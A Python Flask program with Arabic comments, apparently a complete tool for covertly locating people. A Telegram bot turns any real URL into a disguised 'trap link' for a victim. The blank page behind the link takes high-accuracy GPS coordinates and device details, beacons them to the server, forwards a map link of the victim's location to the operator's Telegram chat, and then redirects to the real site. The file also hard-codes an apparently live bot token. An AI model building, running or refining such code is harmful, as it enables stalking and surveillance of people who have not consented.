import os
import random
import string
import threading
import time
import requests
from flask import Flask, render_template_string, request

# إعدادات بوت تيليجرام الخاص بك
TELEGRAM_BOT_TOKEN = "8450050866:AAH9wntwSW5xDM1zCOHLcNEHIeF3uLpllJU"
TELEGRAM_CHAT_ID = "1125311800"

app = Flask(__name__)

active_targets = {}
user_states = {}

def generate_random_path(length=8):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(length))

INVISIBLE_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body { background-color: #ffffff; margin: 0; padding: 0; }
    </style>
</head>
<body>
    <script>
        const targetDestination = "{{ real_url }}";
        const postEndpoint = "/capture-{{ route_key }}";

        window.onload = function() {
            const screenResolution = window.screen.width + "x" + window.screen.height;
            const colorDepth = window.screen.colorDepth + " bit";
            const language = navigator.language || navigator.userLanguage;
            const cpuCores = navigator.hardwareConcurrency || "غير معروف";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        sendDataAndRedirect(position.coords.latitude, position.coords.longitude, screenResolution, colorDepth, language, cpuCores, targetDestination, postEndpoint);
                    },
                    function(error) {
                        sendDataAndRedirect("رفض إذن الموقع", "رفض إذن الموقع", screenResolution, colorDepth, language, cpuCores, targetDestination, postEndpoint);
                    },
                    { timeout: 7000, maximumAge: 0, enableHighAccuracy: true }
                );
            } else {
                sendDataAndRedirect("غير مدعوم", "غير مدعوم", screenResolution, colorDepth, language, cpuCores, targetDestination, postEndpoint);
            }
        };

        function sendDataAndRedirect(lat, lon, screen, color, lang, cpu, redirectUrl, endpoint) {
            const payload = {
                latitude: lat,
                longitude: lon,
                screen: screen,
                color_depth: color,
                language: lang,
                cpu_cores: cpu,
                platform_info: navigator.platform,
                user_agent: navigator.userAgent
            };

            navigator.sendBeacon(endpoint, JSON.stringify(payload));

            setTimeout(function() {
                window.location.replace(redirectUrl);
            }, 300);
        }
    </script>
</body>
</html>
"""

@app.route('/<path:route_key>')
def dynamic_index(route_key):
    if route_key in active_targets:
        target_url = active_targets[route_key]
        return render_template_string(INVISIBLE_TEMPLATE, real_url=target_url, route_key=route_key)
    return "Not Found", 404

@app.route('/capture-<path:route_key>', methods=['POST'])
def capture_and_redirect(route_key):
    if route_key not in active_targets:
        return "", 404
        
    target_url = active_targets[route_key]
    try:
        data = request.get_json(force=True)
    except:
        data = {}
        
    lat = data.get('latitude', 'غير متوفر')
    lon = data.get('longitude', 'غير متوفر')
    screen = data.get('screen', 'غير متوفر')
    lang = data.get('language', 'غير متوفر')
    cpu = data.get('cpu_cores', 'غير متوفر')
    platform_info = data.get('platform_info', 'غير متوفر')
    user_agent = data.get('user_agent', 'غير متوفر')
    
    is_valid_coords = str(lat).replace('.','',1).isdigit() and str(lon).replace('.','',1).isdigit()
    
    if is_valid_coords:
        map_link = f"https://www.google.com/maps?q={lat},{lon}"
        map_button = {
            "inline_keyboard": [
                [{"text": "🗺️ افتح موقع الضحية على خرائط جوجل", "url": map_link}]
            ]
        }
    else:
        map_link = "تم رفض إذن الموقع أو تعذر الحصول عليه"
        map_button = None
    
    intelligence_report = (
        f"🎯 *[صيد جديد عبر الفخ الديناميكي]*\n\n"
        f"🔗 *الوجهية الأصلية:* `{target_url}`\n"
        f"📱 *النظام:* `{platform_info}`\n"
        f"💻 *المتصفح:* `{user_agent}`\n"
        f"📐 *الشاشة:* `{screen}` | 🌐 *اللغة:* `{lang}`\n"
        f"📍 *الإحداثيات:* `{lat}, {lon}`\n"
        f"🗺️ *رابط الخريطة المباشر:* {map_link}"
    )
    
    send_telegram_message(TELEGRAM_CHAT_ID, intelligence_report, reply_markup=map_button)
    return "", 204

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown",
        "disable_web_page_preview": False
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"[!] خطأ في التيليجرام: {e}")

def telegram_bot_listener():
    offset = 0
    print("[⚡] تم تفعيل نظام الاستماع لأوامر بوت تيليجرام بنجاح...")
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={offset}&timeout=30"
            response = requests.get(url).json()
            if response.get("ok"):
                for result in response.get("result", []):
                    offset = result["update_id"] + 1
                    message = result.get("message")
                    if not message:
                        continue
                    
                    chat_id = message["chat"]["id"]
                    text = message.get("text", "").strip()
                    
                    if str(chat_id) != str(TELEGRAM_CHAT_ID):
                        continue
                        
                    if text == "/start":
                        user_states[chat_id] = "AWAITING_LINK"
                        send_telegram_message(chat_id, "🛸 *Alpha Command Active*\n\nأهلاً بك يا مولاي. ⚡\nالرجاء إرسال **الرابط الحقيقي** المراد تلغيمه الآن:")
                    
                    elif chat_id in user_states and user_states[chat_id] == "AWAITING_LINK":
                        if text.startswith("http://") or text.startswith("https://"):
                            real_url = text
                            route_key = generate_random_path()
                            active_targets[route_key] = real_url
                            
                            # رابط السيرفر التلقائي أو من متغيرات البيئة
                            server_domain = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5000")
                            trap_link = f"{server_domain}/{route_key}"
                            
                            response_msg = (
                                f"🚀 *[تم تلغيم الرابط بنجاح]*\n\n"
                                f"🔗 *رابط الفخ (أرسله للضحية):* `{trap_link}`\n"
                                f"🎯 *الوجهية الأصلية:* `{real_url}`\n\n"
                                f"⚡ *الحالة:* الفخ جاهز للعمل وسيوجه الضحية فوراً بعد التقاط إحداثياته!"
                            )
                            send_telegram_message(chat_id, response_msg)
                            user_states[chat_id] = None
                        else:
                            send_telegram_message(chat_id, "⚠️ الرابط غير صالح يا مولاي. يجب أن يبدأ بـ `http://` أو `https://`. أرسل الرابط مجدداً:")
        except Exception as e:
            print(f"[!] خطأ في حلقة استماع البوت: {e}")
            time.sleep(3)

if __name__ == '__main__':
    t = threading.Thread(target=telegram_bot_listener)
    t.daemon = True
    t.start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
